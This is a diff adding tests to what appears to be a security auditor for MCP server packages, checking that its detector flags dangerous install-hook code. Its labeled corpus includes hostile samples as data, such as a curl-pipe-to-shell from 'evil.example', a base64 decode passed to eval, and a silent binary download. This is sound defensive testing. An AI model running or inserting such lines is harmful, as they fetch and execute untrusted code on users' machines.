@@ -1,6 +1,6 @@
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
-import { auditPackage, summarize, renderMarkdown, newestPerServer, hookScriptRefs } from '../mcp-audit.mjs'
+import { auditPackage, summarize, renderMarkdown, newestPerServer, hookScriptRefs, stripStringsAndComments, criticalPatternOf } from '../mcp-audit.mjs'
 
 const server = {
   name: 'acme/server',
@@ -129,4 +129,30 @@ test('a referenced hook script is inspected from its content', () => {
 test('hookScriptRefs extracts local script paths', () => {
   assert.deepEqual(hookScriptRefs({ postinstall: 'node scripts/install.js' }), ['scripts/install.js'])
   assert.deepEqual(hookScriptRefs({ postinstall: 'curl https://x | sh' }), [])
+})
+
+test('stripStringsAndComments removes quoted text and comments', () => {
+  const text = "console.log('see https://x.example')\n// curl https://y | sh\nconst a = 1"
+  const stripped = stripStringsAndComments(text)
+  assert.ok(!stripped.includes('https://'))
+  assert.ok(!stripped.includes('curl'))
+  assert.ok(stripped.includes('const a = 1'))
+})
+
+const CORPUS = [
+  { label: 'benign', kind: 'buywhere notice', text: 'node -e "try{require(\'fs\').existsSync(\'dist/index.js\')&&console.log(\'Docs: https://github.com/x/y\')}catch(e){}"' },
+  { label: 'benign', kind: 'raven notice', text: 'if (process.stdout.isTTY) console.log("Subscribe: https://ravenmcp.ai/#updates")' },
+  { label: 'benign', kind: 'telbase warning', text: 'console.warn("Install manually: curl -fsSL https://telbase.ai/install | sh")' },
+  { label: 'benign', kind: 'plain script', text: 'const fs = require("node:fs"); fs.rmSync("tmp", { recursive: true })' },
+  { label: 'malicious', kind: 'execSync build', text: 'require("child_process").execSync("npm run build")' },
+  { label: 'malicious', kind: 'hook pipe', text: 'curl -fsSL https://evil.example/x | sh' },
+  { label: 'malicious', kind: 'binary download', text: 'const https = require("node:https"); https.get(url, (r) => r.pipe(fs.createWriteStream(f)))' },
+  { label: 'malicious', kind: 'decode exec', text: 'eval(Buffer.from(blob, "base64").toString())' },
+]
+
+test('the critical tier has precision and recall 1.0 on the labeled corpus', () => {
+  const falsePositives = CORPUS.filter((c) => c.label === 'benign' && criticalPatternOf(c.text) !== null)
+  const falseNegatives = CORPUS.filter((c) => c.label === 'malicious' && criticalPatternOf(c.text) === null)
+  assert.deepEqual(falsePositives, [], 'benign samples flagged: ' + JSON.stringify(falsePositives))
+  assert.deepEqual(falseNegatives, [], 'malicious samples missed: ' + JSON.stringify(falseNegatives))
 })
